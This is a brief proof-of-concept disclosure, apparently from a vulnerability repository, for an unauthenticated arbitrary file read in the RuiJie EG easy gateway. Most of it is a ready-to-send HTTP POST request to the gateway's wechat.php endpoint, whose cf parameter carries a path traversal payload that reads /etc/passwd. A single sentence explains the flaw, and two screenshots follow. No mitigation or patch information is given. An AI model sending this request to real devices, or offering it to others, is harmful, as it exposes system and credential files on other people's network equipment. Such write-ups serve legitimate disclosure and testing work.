**RuiJie-EG easy gateway foreground arbitrary file reading**


official website:https://www.ruijie.com.cn/

POC
```
POST /local/auth/php/wechat.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

cf=../../../etc/passwd&usermac=&ip=&mobile=
```

The cf parameter is controllable resulting in arbitrary file reads

![image](https://user-images.githubusercontent.com/129963609/230250819-83a2485b-a764-4bb0-b948-9ebf929f3ea3.png)

![image](https://user-images.githubusercontent.com/129963609/230251011-17812ea7-0a01-483e-a2b5-55bb35b52997.png)

